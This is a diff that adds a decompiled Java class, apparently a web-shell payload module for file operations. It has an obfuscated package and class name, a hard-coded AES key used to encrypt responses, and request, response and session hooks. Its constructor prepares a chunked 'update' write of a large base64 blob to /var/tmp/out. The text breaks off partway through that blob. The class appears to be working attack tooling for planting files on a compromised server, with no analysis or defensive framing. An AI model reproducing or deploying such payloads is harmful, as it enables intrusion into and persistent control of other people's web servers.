@@ -1,0 +1,664 @@
+package sun.fcgadul;
+
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.lang.reflect.Method;
+import java.nio.ByteBuffer;
+import java.nio.channels.FileChannel;
+import java.nio.charset.Charset;
+import java.nio.file.LinkOption;
+import java.nio.file.Path;
+import java.security.MessageDigest;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+import java.util.Random;
+import java.util.Set;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+
+/* JADX INFO: compiled from: FileOperation.java */
+/* JADX INFO: loaded from: 019_frame_404615.class */
+public class Tttxtcfwdd {
+    public static String mode;
+    public static String path;
+    public static String newPath;
+    public static String content;
+    public static String charset;
+    public static String hash;
+    public static String blockIndex;
+    public static String blockSize;
+    public static String createTimeStamp;
+    public static String modifyTimeStamp;
+    public static String accessTimeStamp;
+    private Object Request;
+    private Object Response;
+    private Object Session;
+    private Charset osCharset;
+
+    private byte[] Encrypt(byte[] bArr) throws Exception {
+        SecretKeySpec secretKeySpec = new SecretKeySpec("1f2c8075acd3d118".getBytes("utf-8"), "AES");
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        cipher.init(1, secretKeySpec);
+        byte[] bArrDoFinal = cipher.doFinal(bArr);
+        try {
+            Class<?> cls = Class.forName("java.util.Base64");
+            Object objInvoke = cls.getMethod("getEncoder", null).invoke(cls, null);
+            bArrDoFinal = (byte[]) objInvoke.getClass().getMethod("encode", byte[].class).invoke(objInvoke, bArrDoFinal);
+        } catch (Throwable th) {
+            Object objNewInstance = Class.forName("sun.misc.BASE64Encoder").newInstance();
+            bArrDoFinal = ((String) objNewInstance.getClass().getMethod("encode", byte[].class).invoke(objNewInstance, bArrDoFinal)).replace("\n", "").replace("\r", "").getBytes();
+        }
+        return bArrDoFinal;
+    }
+
+    public Tttxtcfwdd() {
+        mode = "";
+        mode += "update";
+        path = "";
+        path += "/var/tmp/out";
+        blockIndex = "";
+        blockIndex += "6";
+        blockSize = "";
+        blockSize += "30720";
+        content = "";
+        content += "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